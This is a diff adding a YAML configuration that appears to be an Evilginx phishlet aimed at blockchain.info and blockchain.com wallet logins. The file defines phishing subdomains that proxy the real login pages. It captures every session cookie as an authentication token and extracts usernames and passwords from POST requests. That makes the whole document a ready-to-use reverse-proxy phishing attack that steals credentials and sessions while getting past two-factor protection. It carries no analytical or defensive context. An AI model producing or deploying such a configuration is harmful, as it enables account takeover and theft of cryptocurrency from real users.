@@ -1,0 +1,32 @@
+min_ver: '3.2.0'
+
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'blockchain.info', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'blockchain.com', session: true, is_landing: false}
+
+sub_filters:
+  auth_tokens:
+    - domain: '.blockchain.com'
+      keys: ['.*:regexp']
+    - domain: 'blockchain.com'
+      keys: ['.*:regexp']
+    - domain: '.blockchain.info'
+      keys: ['.*:regexp']
+    - domain: 'blockchain.info'
+      keys: ['.*:regexp']
+  auth_urls:
+    - '/login'
+
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'blockchain.info'
+  path: '/login' #path to where the login is, on the domain
